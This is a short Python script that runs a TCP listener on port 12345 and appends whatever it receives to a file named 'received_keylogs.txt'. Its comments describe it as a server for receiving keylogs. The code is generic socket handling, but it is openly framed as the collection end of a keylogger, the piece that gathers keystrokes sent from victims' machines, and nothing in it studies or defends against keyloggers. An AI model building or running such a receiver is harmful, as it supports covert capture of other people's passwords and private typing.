import socket

def receive_data():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Get local machine name
    host = socket.gethostname()
    port = 12345  # Arbitrary non-privileged port
    
    # Bind to the port
    s.bind((host, port))
    
    # Listen for incoming connections
    s.listen(5)
    
    while True:
        # Accept a connection
        c, addr = s.accept()
        print('Got connection from', addr)
        
        # Receive data from the client
        data = c.recv(1024)
        print(data.decode('utf-8'))
        
        # Log the received data to a file
        with open("received_keylogs.txt", "a") as f:
            f.write(data.decode('utf-8') + '\n')
        
        # Close the connection
        c.close()

# Start the server to receive keylogs
receive_data()
